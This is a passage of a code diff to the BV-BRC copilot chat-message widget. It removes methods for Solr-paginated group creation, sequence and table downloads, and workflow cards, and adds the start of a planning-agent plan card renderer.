-        var baseSpGeneRefUrl = 'https://www.bv-brc.org/view/SpecialtyVFGeneList/';
-        return {
-          url: baseSpGeneRefUrl + queryText,
-          collection: collection,
-          sourceTool: options.sourceTool || null
-        };
-      }
-      else if (collection && collection.toLowerCase() === 'protein_feature' && queryText) {
-        var baseDomainsMotifsUrl = 'https://www.bv-brc.org/view/DomainsAndMotifsList/';
-        return {
-          url: baseDomainsMotifsUrl + queryText,
-          collection: collection,
-          sourceTool: options.sourceTool || null
-        };
-      }
-      else {
-        var baseUrl = 'https://www.bv-brc.org/search/';
-        return {
-          url: baseUrl + queryText,
-          collection: collection,
-          sourceTool: options.sourceTool || null
-        };
-      }
-    },
-
-    _openQueryLink: function(opts) {
-      var openPlan = this._buildQueryLinkOpenPlan(opts);
-      if (!openPlan || !openPlan.url) {
-        return;
-      }
-      window.open(openPlan.url, '_blank', 'noopener,noreferrer');
-    },
+    // ==================== Planning Agent Rendering ====================
 
     /**
-     * Map of collection names to their Solr uniqueKey field for cursor pagination.
-     * Cursor-based pagination requires sort on the collection's unique key.
-     * Values sourced from bvbrc-python-api/bvbrc_solr_api/resources/*.py stream_all_solr() defaults.
-     * @private
+     * Render a PlanCard widget for the planning agent's plan.
+     * @param {HTMLElement} parentNode - The message content node to append to.
      */
-    _collectionSolrUniqueKey: {
-      genome: 'genome_id',
-      genome_feature: 'feature_id',
-      taxonomy: 'taxon_id',
-      genome_amr: 'id',
-      genome_sequence: 'sequence_id',
-      sp_gene: 'id',
-      pathway: 'id',
-      subsystem: 'id',
-      protein_family_ref: 'family_id',
-      sp_gene_ref: 'id',
-      antibiotics: 'pubchem_cid',
-      enzyme_class_ref: 'ec_number',
-      gene_ontology_ref: 'go_id',
-      protein_structure: 'pdb_id',
-      protein_feature: 'id',
-      epitope: 'epitope_id',
-      serology: 'id',
-      strain: 'id',
-      surveillance: 'id'
-    },
-
-    /**
-     * Shows a progress overlay dialog for group creation data download.
-     * Displays a progress bar, status text, and a cancel button.
-     * @param {Object} opts - Options
-     * @param {number} opts.total - Total number of records (from numFound), or null if unknown
-     * @param {Function} opts.onCancel - Callback when user clicks Cancel
-     * @returns {Object} Handle with update(fetched), close(), and isCancelled() methods
-     * @private
-     */
-    _showGroupProgressDialog: function(opts) {
-      var total = (opts && typeof opts.total === 'number') ? opts.total : null;
-      var onCancel = (opts && typeof opts.onCancel === 'function') ? opts.onCancel : function() {};
-      var cancelled = false;
-
-      // Build progress dialog content
-      var contentDiv = domConstruct.create('div', {
-        style: 'padding: 16px; min-width: 320px; font-family: inherit;'
-      });
-      var statusText = domConstruct.create('div', {
-        innerHTML: 'Downloading data for group creation...',
-        style: 'margin-bottom: 12px; font-size: 13px; color: #333;'
-      }, contentDiv);
-      var progressBarOuter = domConstruct.create('div', {
-        style: 'width: 100%; height: 20px; background: #e0e0e0; border-radius: 4px; overflow: hidden; margin-bottom: 12px;'
-      }, contentDiv);
-      var progressBarInner = domConstruct.create('div', {
-        style: 'width: 0%; height: 100%; background: #2196F3; border-radius: 4px; transition: width 0.3s ease;'
-      }, progressBarOuter);
-      var countText = domConstruct.create('div', {
-        innerHTML: total !== null ? '0 of ' + total.toLocaleString() + ' records' : '0 records fetched...',
-        style: 'margin-bottom: 16px; font-size: 12px; color: #666; text-align: center;'
-      }, contentDiv);
-      var cancelBtn = domConstruct.create('button', {
-        type: 'button',
-        innerHTML: 'Cancel',
-        class: 'workspace-summary-open-button',
-        style: 'display: block; margin: 0 auto;'
-      }, contentDiv);
-
-      var dlg = new Dialog({
-        title: 'Downloading Data',
-        content: contentDiv,
-        closable: false,
-        style: 'z-index: 10000;'
-      });
-
-      on(cancelBtn, 'click', function() {
-        cancelled = true;
-        onCancel();
-        dlg.hide();
-        setTimeout(function() { dlg.destroyRecursive(); }, 300);
-      });
-
-      dlg.show();
-
-      return {
-        update: function(fetched) {
-          if (total !== null) {
-            var pct = Math.min(100, Math.round((fetched / total) * 100));
-            progressBarInner.style.width = pct + '%';
-            countText.innerHTML = fetched.toLocaleString() + ' of ' + total.toLocaleString() + ' records (' + pct + '%)';
-          } else {
-            countText.innerHTML = fetched.toLocaleString() + ' records fetched...';
-          }
-          statusText.innerHTML = 'Downloading data for group creation...';
-        },
-        close: function() {
-          dlg.hide();
-          setTimeout(function() { dlg.destroyRecursive(); }, 300);
-        },
-        isCancelled: function() {
-          return cancelled;
-        }
-      };
-    },
-
-    /**
-     * Fetches all rows for group creation using Solr-style cursor-based pagination.
-     * Sends POST requests to the BV-BRC data API with application/solrquery+x-www-form-urlencoded
-     * content type, which supports cursorMark for efficient deep pagination without
-     * burdening the backend.
-     *
-     * @param {Object} payload - The query collection payload from renderQueryCollectionWidget
-     * @param {string} payload.collection - Collection name (e.g. 'genome', 'genome_feature')
-     * @param {string} payload.solrQuery - Solr q expression from tool_call.arguments_executed.q
-     * @param {string|null} payload.dataApiBaseUrl - Base API URL override
-     * @param {number|null} payload.numFound - Total result count if known
-     * @param {string} idField - The ID field to extract (e.g. 'genome_id', 'feature_id')
-     * @returns {Promise<Array>} Promise resolving to array of row objects containing at least the idField
-     * @private
-     */
-    _fetchAllRowsForGroup: function(payload, idField) {
-      var self = this;
-      var collection = payload.collection || '';
-      var numFound = typeof payload.numFound === 'number' ? payload.numFound : null;
-      var solrQuery = payload.solrQuery || '*:*';
-      var baseApiUrl = (payload.dataApiBaseUrl || 'https://www.bv-brc.org/api-bulk').replace(/\/+$/, '');
-      var solrUrl = baseApiUrl + '/' + collection + '/';
-
-      if (!collection) {
-        var dfd = new Deferred();
-        dfd.reject(new Error('No collection specified'));
-        return dfd.promise;
-      }
-
-      // Determine sort field for cursor pagination (must sort on Solr unique key)
-      var sortField = self._collectionSolrUniqueKey[collection] || 'id';
-
-      // Only request the fields we need
-      var selectFields = [idField];
-      if (idField !== sortField) {
-        selectFields.push(sortField);
-      }
-      if (idField === 'feature_id') {
-        // Also include genome_id for genome group creation from feature data
-        selectFields.push('genome_id');
-      }
-      // Deduplicate
-      var uniqueFields = [];
-      selectFields.forEach(function(f) {
-        if (uniqueFields.indexOf(f) === -1) uniqueFields.push(f);
-      });
-
-      var pageSize = 100;
-
-      // Show progress dialog
-      var progressHandle = self._showGroupProgressDialog({
-        total: numFound,
-        onCancel: function() { /* cancellation is checked via isCancelled() */ }
-      });
-
-      var allRows = [];
-      var cancelled = false;
-
-      // Use a master Deferred that we resolve/reject manually to avoid
-      // issues mixing native Promises with Dojo Deferreds.
-      var masterDfd = new Deferred();
-
-      var fetchPage = function(cursorMark) {
-        if (progressHandle.isCancelled() || cancelled) {
-          progressHandle.close();
-          masterDfd.reject(new Error('cancelled'));
+    renderPlanCard: function (parentNode) {
+      try {
+        // During live SSE, _applyToolMetadataToAssistantMessage sets planData.
+        // When restoring from MongoDB, the plan lives under message.plan or
+        // message.card.card_payload instead.  Fall back through all three.
+        var planData = this.message.planData
+          || this.message.plan
+          || (this.message.card && this.message.card.card_payload);
+        if (!planData || !planData.steps) {
+          console.warn('[ChatMessage] renderPlanCard called without valid planData');
           return;
         }
 
-        // Build Solr form-urlencoded POST body
-        var formParams = {
-          q: solrQuery,
-          rows: pageSize,
-          sort: sortField + ' asc',
-          fl: uniqueFields.join(','),
-          cursorMark: cursorMark,
-          wt: 'json'
-        };
-
-        // Encode as form data string
-        var formParts = [];
-        Object.keys(formParams).forEach(function(key) {
-          formParts.push(encodeURIComponent(key) + '=' + encodeURIComponent(formParams[key]));
-        });
-        var formBody = formParts.join('&');
-
-        var headers = {
-          'Accept': 'application/solr+json',
-          'Content-Type': 'application/solrquery+x-www-form-urlencoded',
-          'X-Requested-With': null
-        };
-        if (window.App && window.App.authorizationToken) {
-          headers['Authorization'] = authHeader();
-        }
-
-        request.post(solrUrl, {
-          data: formBody,
-          headers: headers,
-          handleAs: 'json'
-        }).then(
-          function(result) {
-            if (progressHandle.isCancelled() || cancelled) {
-              progressHandle.close();
-              masterDfd.reject(new Error('cancelled'));
-              return;
-            }
-
-            var response = (result && result.response) ? result.response : {};
-            var docs = Array.isArray(response.docs) ? response.docs : [];
-            var nextCursor = result.nextCursorMark || null;
-
-            // Update numFound from first response if we didn't have it
-            if (numFound === null && typeof response.numFound === 'number') {
-              numFound = response.numFound;
-            }
-
-            allRows = allRows.concat(docs);
-            progressHandle.update(allRows.length);
-
-            console.log('[ChatMessage] Group fetch page: got', docs.length, 'docs, total so far:', allRows.length, 'of', numFound || '?');
-
-            // Check if we're done: no next cursor, cursor unchanged, or we have all rows
-            var done = !nextCursor ||
-              nextCursor === cursorMark ||
-              (numFound !== null && allRows.length >= numFound);
-
-            if (done) {
-              progressHandle.close();
-              masterDfd.resolve(allRows);
-              return;
-            }
-
-            // Fetch next page
-            fetchPage(nextCursor);
-          },
-          function(err) {
-            progressHandle.close();
-            masterDfd.reject(err);
-          }
-        );
-      };
-
-      // Start pagination from cursor "*"
-      fetchPage('*');
-
-      return masterDfd.promise;
-    },
-
-    /**
-     * Opens the SelectionToGroup dialog to create a genome or feature group
-     * from the provided row data.
-     *
-     * @param {Array} rows - Array of data objects containing the relevant ID field
-     * @param {string} groupType - 'genome_group' or 'feature_group'
-     * @param {string} idField - 'genome_id' or 'feature_id'
-     * @private
-     */
-    _openCreateGroupDialog: function(rows, groupType, idField) {
-      // Filter to only rows that have the required ID field
-      var validRows = rows.filter(function(row) {
-        return row && idField in row && row[idField] !== null && row[idField] !== undefined && row[idField] !== '';
-      });
-
-      if (validRows.length === 0) {
-        var errorDlg = new Dialog({
-          title: 'Cannot Create Group',
-          content: '<div style="padding: 16px;">No valid ' + idField.replace(/_/g, ' ') + ' values found in the results.</div>'
-        });
-        errorDlg.show();
-        return;
-      }
-
-      var defaultPath = WorkspaceManager.getDefaultFolder(groupType);
-      var displayType = groupType === 'genome_group' ? 'Genome Group' : 'Feature Group';
-
-      // Lazy-load SelectionToGroup to avoid loading WorkspaceObjectSelector
-      // (and its window.App dependency) at module definition time.
-      // Must use full AMD path since dynamic require() doesn't resolve relative paths.
-      require(['p3/widget/SelectionToGroup'], function(SelectionToGroup) {
-        var stg = new SelectionToGroup({
-          selection: validRows,
-          type: groupType,
-          idType: idField,
-          path: defaultPath
+        var planCard = new PlanCard({
+          plan: planData,
+          copilotApi: this.copilotApi || null,
+          sessionId: this.message.session_id || this.sessionId || null,
+          completedResults: {}
         });
 
-        var dlg = new Dialog({
-          title: 'Create ' + displayType + ' (' + validRows.length.toLocaleString() + ' items)',
-          content: stg
-        });
-
-        on(dlg.domNode, 'dialogAction', function() {
-          dlg.hide();
-          setTimeout(function() { dlg.destroyRecursive(); }, 300);
-        });
-
-        stg.startup();
-        dlg.show();
-      });
-    },
-
-    /**
-     * Handles a group creation button click: fetches all data rows via cursor
-     * pagination, then opens the SelectionToGroup dialog.
-     *
-     * @param {Object} payload - The query collection payload
-     * @param {string} groupType - 'genome_group' or 'feature_group'
-     * @param {string} idField - 'genome_id' or 'feature_id'
-     * @private
-     */
-    _handleCreateGroupClick: function(payload, groupType, idField) {
-      var self = this;
-
-      // Check if rows are already fully available in the payload
-      var existingRows = Array.isArray(payload.rows) ? payload.rows : [];
-      var numFound = typeof payload.numFound === 'number' ? payload.numFound : null;
-      var hasAllRows = existingRows.length > 0 && numFound !== null && existingRows.length >= numFound;
-
-      if (hasAllRows) {
-        // All rows already loaded, skip fetch
-        self._openCreateGroupDialog(existingRows, groupType, idField);
-        return;
-      }
-
-      // Fetch all rows via cursor pagination
-      self._fetchAllRowsForGroup(payload, idField).then(
-        function(allRows) {
-          console.log('[ChatMessage] Group data fetch complete, rows:', allRows.length, 'opening dialog for', groupType);
-          self._openCreateGroupDialog(allRows, groupType, idField);
-        },
-        function(err) {
-          if (err && err.message && err.message.indexOf('cancelled') !== -1) {
-            // User cancelled, do nothing
-            return;
-          }
-          console.error('[ChatMessage] Error fetching data for group creation:', err);
-          var errDlg = new Dialog({
-            title: 'Error',
-            content: '<div style="padding: 16px;">Failed to download data for group creation: ' +
-              (err && err.message ? err.message : 'Unknown error') + '</div>'
-          });
-          errDlg.show();
-        }
-      );
-    },
-
-    renderQueryCollectionWidget: function(messageDiv) {
-      var data = this.message.queryCollectionData || {};
-      var summary = data.summary || {};
-      var params = data.queryParameters || {};
-      var toolCall = (this.message && this.message.tool_call && typeof this.message.tool_call === 'object')
-        ? this.message.tool_call
-        : null;
-      var toolArgs = (toolCall && toolCall.arguments_executed && typeof toolCall.arguments_executed === 'object')
-        ? toolCall.arguments_executed
-        : {};
-      var rqlReplay = (toolCall && toolCall.replay && toolCall.replay.rql_replay_query)
-        ? toolCall.replay.rql_replay_query
-        : null;
-      var summaryText = this.message.chatSummary || 'Data query ready.';
-      if (rqlReplay == null) {
-        return;
-      }
-      var rqlQueryUrl = toolArgs.data_api_base_url ? toolArgs.data_api_base_url : "https://www.bv-brc.org/api-bulk";
-      rqlQueryUrl = rqlQueryUrl + '/' + toolArgs.collection + '/';
-      if (rqlReplay[0] === '?') {
-        rqlQueryUrl = rqlQueryUrl + rqlReplay;
-      } else {
-        rqlQueryUrl = rqlQueryUrl + "?" + rqlReplay;
-      }
-      var inferCollectionFromUrl = function(rqlUrl) {
-        if (!rqlUrl || typeof rqlUrl !== 'string') return null;
-        var withoutQuery = rqlUrl.split('?')[0];
-        var parts = withoutQuery.split('/').filter(function(part) { return !!part; });
-        return parts.length ? parts[parts.length - 1] : null;
-      };
-      var collection = params.collection ||
-        toolArgs.collection ||
-        data.collection ||
-        inferCollectionFromUrl(rqlQueryUrl) ||
-        'query_collection';
-
-      var rows = Array.isArray(data.resultRows) ? data.resultRows : [];
-      var rowCount = summary.total !== undefined && summary.total !== null
-        ? summary.total
-        : rows.length;
-      var collectionLabel = (collection || '').replace(/_/g, ' ');
-      var detailLine = collectionLabel;
-
-      // Snapshot metadata
-      var numFound = typeof data.numFound === 'number' ? data.numFound : null;
-      var isSnapshot = data.is_snapshot === true;
-      var snapshotLimit = typeof data.snapshot_limit === 'number' ? data.snapshot_limit : null;
-      var downloadUrl = data.download_url || null;
-      var displayCount = rows.length || rowCount;
-
-      var payload = {
-        queryParameters: params,
-        collection: collection,
-        rqlQueryUrl: rqlQueryUrl,
-        rqlReplay: rqlReplay,
-        summary: summary,
-        rows: rows,
-        numFound: numFound,
-        is_snapshot: isSnapshot,
-        snapshot_limit: snapshotLimit,
-        download_url: downloadUrl,
-        // Solr query metadata for cursor-based group creation fetch
-        solrQuery: toolArgs.q || null,
-        dataApiBaseUrl: toolArgs.data_api_base_url || null
-      };
-
-      // Build count-aware status text
-      var statusText;
-      if (numFound !== null) {
-        statusText = 'Found ' + numFound.toLocaleString() + ' results';
-      } else {
-        statusText = 'Review your results';
-      }
-
-      var container = domConstruct.create('div', {
-        class: 'workspace-summary-card'
-      }, messageDiv);
-
-      domConstruct.create('div', {
-        class: 'tool-card-status-row workspace-summary-text',
-        innerHTML: statusText
-      }, container);
-
-      domConstruct.create('div', {
-        class: 'workspace-summary-path',
-        innerHTML: this.escapeHtml(detailLine)
-      }, container);
-
-      var data_tab_list = ['genome', 'taxonomy', 'genome_feature'];
-      if (toolArgs.collection && data_tab_list.includes(toolArgs.collection.toLowerCase())) {
-        var dataTabButton = domConstruct.create('button', {
-          type: 'button',
-          class: 'workspace-summary-open-button',
-          innerHTML: 'Open in Chat'
-        }, container);
-        on(dataTabButton, 'click', lang.hitch(this, function() {
-          topic.publish('CopilotDataBrowseOpen', {
-            uiPayload: payload,
-            tool_call: toolCall,
-            chatSummary: summaryText,
-            uiAction: 'open_data_tab'
-          });
-        }));
-      }
-
-      if (rqlQueryUrl) {
-        var queryLink = domConstruct.create('a', {
-          class: 'workspace-summary-link',
-          href: '#',
-          innerHTML: 'Open in Website'
-        }, container);
-        on(queryLink, 'click', lang.hitch(this, function(evt) {
-          evt.preventDefault();
-          this._openQueryLink({
-            rqlQueryUrl: rqlQueryUrl,
-            rqlReplay: rqlReplay,
-            collection: collection,
-            sourceTool: this.message && this.message.source_tool ? this.message.source_tool : null
-          });
-        }));
-      }
-
-      if (collection && collection.toLowerCase() === 'genome_feature' && rqlQueryUrl) {
-        // Build the RQL query for FASTA downloads.
-        // rqlReplay comes from the MCP server already URL-encoded via Python's
-        // quote().  We decode it to raw RQL, then strip double quotes from
-        // keyword() values because the BV-BRC POST RQL parser rejects literal
-        // '"' as an illegal character.  (The GET-based TSV download works with
-        // %22 in the URL, but the POST-based FASTA download does not.)
-        var rawRqlReplay = rqlReplay;
-        if (rawRqlReplay && rawRqlReplay.charAt(0) === '?') {
-          rawRqlReplay = rawRqlReplay.substring(1);
-        }
-        try {
-          rawRqlReplay = decodeURIComponent(rawRqlReplay);
-        } catch (e) {
-          // If decoding fails, use as-is
-        }
-        // Remove double quotes inside keyword() — the BV-BRC POST parser
-        // cannot handle them.  keyword(value) works identically without quotes.
-        rawRqlReplay = rawRqlReplay.replace(/keyword\("([^"]*)"\)/g, 'keyword($1)');
-        var fastaRqlQuery = rawRqlReplay + '&limit(100000)&sort(+feature_id)';
-
-        // Use the standard BV-BRC data service URL for FASTA downloads,
-        // matching the pattern used by the rest of the website
-        // (DownloadTooltipDialog.js, FeatureGridContainer.js, etc.).
-        var fastaDataServiceUrl = (window.App && window.App.dataServiceURL)
-          ? window.App.dataServiceURL
-          : toolArgs.data_api_base_url || 'https://www.bv-brc.org/api';
-        if (fastaDataServiceUrl.charAt(fastaDataServiceUrl.length - 1) !== '/') {
-          fastaDataServiceUrl += '/';
-        }
-        var fastaBaseUrl = fastaDataServiceUrl + 'genome_feature/';
-
-        var createFastaLink = lang.hitch(this, function(linkLabel, acceptType) {
-          var fastaLink = domConstruct.create('a', {
-            class: 'workspace-summary-link',
-            href: '#',
-            innerHTML: linkLabel
-          }, container);
-          on(fastaLink, 'click', lang.hitch(this, function(evt) {
-            evt.preventDefault();
-            // Use hidden form POST, same pattern as DownloadTooltipDialog.js
-            var actionUrl = fastaBaseUrl + '?http_download=true&http_accept=' + encodeURIComponent(acceptType);
-            // Remove any previous download form
-            var oldForm = document.getElementById('copilotFastaDownloadForm');
-            if (oldForm) { oldForm.parentNode.removeChild(oldForm); }
-            var form = domConstruct.create('form', {
-              style: 'display: none;',
-              id: 'copilotFastaDownloadForm',
-              enctype: 'application/x-www-form-urlencoded',
-              name: 'copilotFastaDownloadForm',
-              method: 'post',
-              action: actionUrl
-            }, document.body);
-            // Set the raw RQL as the value — the browser's form encoding
-            // (application/x-www-form-urlencoded) will URL-encode it
-            // automatically before sending.  Do NOT use encodeURIComponent()
-            // here; that would double-encode the value.
-            domConstruct.create('input', { type: 'hidden', value: fastaRqlQuery, name: 'rql' }, form);
-            if (window.App && window.App.authorizationToken) {
-              domConstruct.create('input', { type: 'hidden', value: window.App.authorizationToken, name: 'http_authorization' }, form);
-            }
-            form.submit();
-            // Clean up the form after a short delay
-            setTimeout(function() {
-              if (form.parentNode) { form.parentNode.removeChild(form); }
-            }, 5000);
-          }));
-        });
-
-        createFastaLink('Download DNA Fasta', 'application/dna+fasta');
-        createFastaLink('Download Protein Fasta', 'application/protein+fasta');
-      }
-
-      // Download Full Dataset (TSV) link - shown when snapshot has a download URL
-      if (downloadUrl && isSnapshot) {
-        var tsvLabel = numFound !== null
-          ? 'Download all ' + numFound.toLocaleString() + ' results as TSV'
-          : 'Download Full Dataset (TSV)';
-        var tsvLink = domConstruct.create('a', {
-          class: 'workspace-summary-link',
-          href: '#',
-          innerHTML: tsvLabel
-        }, container);
-        on(tsvLink, 'click', function(evt) {
-          evt.preventDefault();
-          var tsvDownloadUrl = downloadUrl;
-          if (window.App && window.App.authorizationToken) {
-            tsvDownloadUrl += '&http_authorization=' + encodeURIComponent(window.App.authorizationToken);
-          }
-          window.open(tsvDownloadUrl, '_blank', 'noopener,noreferrer');
-        });
-      }
-
-      // Group creation buttons - shown for genome and genome_feature collections
-      // when the user is authenticated
-      if (window.App && window.App.user) {
-        var normalizedCollection = collection ? collection.toLowerCase() : '';
-        var showGenomeGroup = (normalizedCollection === 'genome' || normalizedCollection === 'genome_feature');
-        var showFeatureGroup = (normalizedCollection === 'genome_feature');
-
-        if (showGenomeGroup || showFeatureGroup) {
-          var groupActionsDiv = domConstruct.create('div', {
-            style: 'margin-top: 6px; padding-top: 6px; border-top: 1px solid #e0e0e0;'
-          }, container);
-
-          if (showFeatureGroup) {
-            var featureGroupBtn = domConstruct.create('button', {
-              type: 'button',
-              class: 'workspace-summary-open-button',
-              innerHTML: '<i class="fa icon-object-group" style="margin-right: 4px;"></i>Create Feature Group',
-              style: 'margin-right: 8px;'
-            }, groupActionsDiv);
-            on(featureGroupBtn, 'click', lang.hitch(this, function() {
-              this._handleCreateGroupClick(payload, 'feature_group', 'feature_id');
-            }));
-          }
-
-          if (showGenomeGroup) {
-            var genomeGroupBtn = domConstruct.create('button', {
-              type: 'button',
-              class: 'workspace-summary-open-button',
-              innerHTML: '<i class="fa icon-object-group" style="margin-right: 4px;"></i>Create Genome Group'
-            }, groupActionsDiv);
-            on(genomeGroupBtn, 'click', lang.hitch(this, function() {
-              this._handleCreateGroupClick(payload, 'genome_group', 'genome_id');
-            }));
-          }
-        }
-      }
-
-      // Selection indicator for files (query results become session files)
-      this._renderSelectionIndicator(container, {
-        category: 'files',
-        getSelectedItems: lang.hitch(this, function() {
-          var items = this._getSelectionItemsForCategory('files');
-          return items.map(function(item) {
-            return { label: item.file_name || item.id || 'File', id: item.id || item.file_id };
-          });
-        })
-      });
-    },
-
-    /**
-     * Maps app names to human-readable service display names
-     * @param {string} appName - Application identifier (e.g., GenomeAssembly2)
-     * @returns {string} Display name
-     */
-    _getServiceDisplayName: function(appName) {
-      var map = {
-        'GenomeAssembly2': 'Genome Assembly',
-        'GenomeAnnotation': 'Genome Annotation',
-        'ComparativeSystems': 'Comparative Systems'
-      };
-      return map[appName] || appName;
-    },
-
-    /**
-     * Renders a simplified service card for single-step workflows
-     * @param {HTMLElement} messageDiv - Container to render into
-     * @param {Object} workflow - Workflow data with steps[0]
-     */
-    renderSimplifiedServiceCard: function(messageDiv, workflow) {
-      var step = workflow.steps && workflow.steps[0];
-      var serviceName = step ? this._getServiceDisplayName(step.app) : (workflow.workflow_name || 'Workflow');
-      if (!serviceName && step && step.step_name) {
-        serviceName = step.step_name;
-      }
-      var isSubmitted = workflow.execution_metadata && workflow.execution_metadata.is_submitted;
-      var statusValue = (workflow.execution_metadata && workflow.execution_metadata.status) ||
-        workflow.status || (isSubmitted ? 'submitted' : '') || 'planned';
-      var normalizeStatus = function(s) {
-        return (!s && s !== 0) ? '' : String(s).toLowerCase();
-      };
-      var getStatusStyle = function(s) {
-        var st = normalizeStatus(s);
-        if (st === 'succeeded' || st === 'completed') return 'background: #10b981; color: #fff;';
-        if (st === 'failed' || st === 'error') return 'background: #ef4444; color: #fff;';
-        if (st === 'cancelled') return 'background: #6b7280; color: #fff;';
-        if (st === 'running') return 'background: #2563eb; color: #fff;';
-        if (st === 'queued' || st === 'pending') return 'background: #f59e0b; color: #111827;';
-        if (st === 'submitted') return 'background: #14b8a6; color: #fff;';
-        if (st === 'planned') return 'background: #6366f1; color: #fff;';
-        return 'background: #9ca3af; color: #fff;';
-      };
-      var statusBadgeLabel = statusValue ? this.escapeHtml(String(statusValue).toUpperCase()) : '';
-
-      var card = domConstruct.create('div', {
-        class: 'copilot-service-card workflow-manifest-card'
-      }, messageDiv);
-
-      var titleRow = domConstruct.create('div', {
-        class: 'copilot-service-card-actions',
-        style: 'display: flex; align-items: center; justify-content: space-between; margin-bottom: 0; padding-top: 0; border-top: none;'
-      }, card);
-
-      domConstruct.create('div', {
-        class: 'copilot-service-card-title',
-        innerHTML: this.escapeHtml(serviceName)
-      }, titleRow);
-
-      if (statusBadgeLabel) {
-        domConstruct.create('span', {
-          innerHTML: statusBadgeLabel,
-          style: 'padding: 2px 6px; font-size: 11px; border-radius: 3px; font-weight: 500; ' + getStatusStyle(statusValue)
-        }, titleRow);
-      }
-
-      var actionsRow = domConstruct.create('div', {
-        class: 'copilot-service-card-actions'
-      }, card);
-
-      var reviewButton = domConstruct.create('button', {
-        innerHTML: (isSubmitted ? 'View Results' : 'Review'),
-        class: 'workflow-review-btn',
-        title: 'Review and edit service parameters'
-      }, actionsRow);
-
-      on(reviewButton, 'click', lang.hitch(this, function() {
-        this.showWorkflowDialog();
-      }));
-
-      if (!isSubmitted) {
-        var self = this;
-        var submitButton = domConstruct.create('button', {
-          innerHTML: 'Submit',
-          type: 'button',
-          style: 'padding: 8px 16px; background: #2563eb; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-weight: 500;'
-        }, actionsRow);
-
-        on(submitButton, 'click', lang.hitch(this, function() {
-          if (!self.copilotApi || submitButton.disabled) return;
-          var workflowToSubmit = {};
-          try {
-            workflowToSubmit = JSON.parse(JSON.stringify(workflow));
-          } catch (e) {
-            workflowToSubmit = workflow;
-          }
-          delete workflowToSubmit.execution_metadata;
-
-          submitButton.disabled = true;
-          submitButton.innerHTML = 'Submitting...';
-
-          self.copilotApi.submitWorkflowForExecution(workflowToSubmit).then(function(response) {
-            if (response && response.error) {
-              submitButton.disabled = false;
-              submitButton.innerHTML = 'Submit';
-              topic.publish('/Notification', { message: 'Submission failed: ' + response.error, type: 'error' });
-              return;
-            }
-            var wfId = response && response.workflow_id;
-            var status = (response && response.status) || 'submitted';
-            var statusUrl = wfId && (window.App.workflow_url || 'https://dev-7.bv-brc.org/api/v1') + '/workflows/' + wfId + '/status';
-
-            if (!workflow.execution_metadata) workflow.execution_metadata = {};
-            workflow.execution_metadata.workflow_id = wfId;
-            workflow.execution_metadata.status = status;
-            workflow.execution_metadata.is_submitted = true;
-            workflow.execution_metadata.is_planned = false;
-            workflow.execution_metadata.status_url = statusUrl;
-            workflow.execution_metadata.submitted_at = new Date().toISOString();
-
-            topic.publish('CopilotWorkflowCardStatusUpdated', {
-              session_id: self.sessionId || null,
-              message_id: self.message && self.message.message_id ? self.message.message_id : null,
-              workflow: workflow
-            });
-
-            submitButton.innerHTML = 'Submitted';
-            topic.publish('/Notification', { message: 'Workflow submitted successfully.', type: 'message' });
-
-            if (self.sessionId && self.copilotApi && typeof self.copilotApi.addWorkflowToSession === 'function') {
-              self.copilotApi.addWorkflowToSession(self.sessionId, wfId).catch(function() {});
-            }
-          }, function(err) {
-            submitButton.disabled = false;
-            submitButton.innerHTML = 'Submit';
-            topic.publish('/Notification', { message: 'Submission failed: ' + (err && err.message ? err.message : err), type: 'error' });
-          });
-        }));
-      }
-
-      // Selection indicator for workflows
-      this._renderSelectionIndicator(card, {
-        category: 'workflows',
-        getSelectedItems: lang.hitch(this, function() {
-          var items = this._getSelectionItemsForCategory('workflows');
-          return items.map(function(item) {
-            return { label: item.workflow_name || item.workflow_id || item.id || 'Workflow', id: item.workflow_id || item.id };
-          });
-        })
-      });
-    },
-
-    /**
-     * Renders a workflow manifest card with workflow details
-     * Displays workflow name, step count, output folder, and a Review button
-     * For single-step workflows, renders a simplified service card instead.
-     * @param {HTMLElement} messageDiv - Container to render widget into
-     */
-    renderWorkflowManifestCard: function(messageDiv) {
-      var workflow = this.message.workflowData || {};
-      var messageToolCall = this.message && this.message.tool_call && typeof this.message.tool_call === 'object'
-        ? this.message.tool_call
-        : null;
-      var toolCallArgs = messageToolCall && messageToolCall.arguments_executed && typeof messageToolCall.arguments_executed === 'object'
-        ? messageToolCall.arguments_executed
-        : {};
-
-      // Extract workflow information
-      var workflowName = workflow.workflow_name || this.message.workflow_name || 'Workflow';
-      var workflowDescription = workflow.workflow_description ||
-        (workflow.execution_metadata && workflow.execution_metadata.workflow_description) ||
-        '';
-      var stepCount = 0;
-      var outputFolder = '';
-
-      // Count steps
-      if (workflow.steps && Array.isArray(workflow.steps)) {
-        stepCount = workflow.steps.length;
-      }
-
-      var isSingleStep = workflow && workflow.steps && workflow.steps.length === 1;
-      if (isSingleStep) {
-        this.renderSimplifiedServiceCard(messageDiv, workflow);
-        return;
-      }
-
-      // Get output folder
-      if (workflow.base_context && workflow.base_context.workspace_output_folder) {
-        outputFolder = workflow.base_context.workspace_output_folder;
-      }
-
-      // Get status from execution metadata
-      var isSubmitted = workflow.execution_metadata && workflow.execution_metadata.is_submitted;
-      var isPlanned = workflow.execution_metadata && workflow.execution_metadata.is_planned;
-      var statusUrl = (workflow.execution_metadata && workflow.execution_metadata.status_url) || workflow.status_url || null;
-
-      var extractWorkflowIdFromStatusUrl = function(urlValue) {
-        if (!urlValue || typeof urlValue !== 'string') {
-          return null;
-        }
-        var match = urlValue.match(/\/workflows\/([^\/\?]+)(?:\/status)?(?:\?.*)?$/i);
-        return match && match[1] ? decodeURIComponent(match[1]) : null;
-      };
-
-      var workflowId = workflow.workflow_id ||
-        workflow.id ||
-        (workflow.execution_metadata && (workflow.execution_metadata.workflow_id || workflow.execution_metadata.id)) ||
-        toolCallArgs.workflow_id ||
-        (messageToolCall && messageToolCall.workflow_id) ||
-        this.message.workflow_id ||
-        extractWorkflowIdFromStatusUrl(statusUrl) ||
-        null;
-
-      var normalizeStatus = function(rawStatus) {
-        if (!rawStatus && rawStatus !== 0) return '';
-        return String(rawStatus).toLowerCase();
-      };
-
-      var getStatusStyle = function(statusValue) {
-        var status = normalizeStatus(statusValue);
-        if (status === 'succeeded' || status === 'completed') {
-          return 'background: #10b981; color: #fff;';
-        }
-        if (status === 'failed' || status === 'error') {
-          return 'background: #ef4444; color: #fff;';
-        }
-        if (status === 'cancelled') {
-          return 'background: #6b7280; color: #fff;';
-        }
-        if (status === 'running') {
-          return 'background: #2563eb; color: #fff;';
-        }
-        if (status === 'queued' || status === 'pending') {
-          return 'background: #f59e0b; color: #111827;';
-        }
-        if (status === 'submitted') {
-          return 'background: #14b8a6; color: #fff;';
-        }
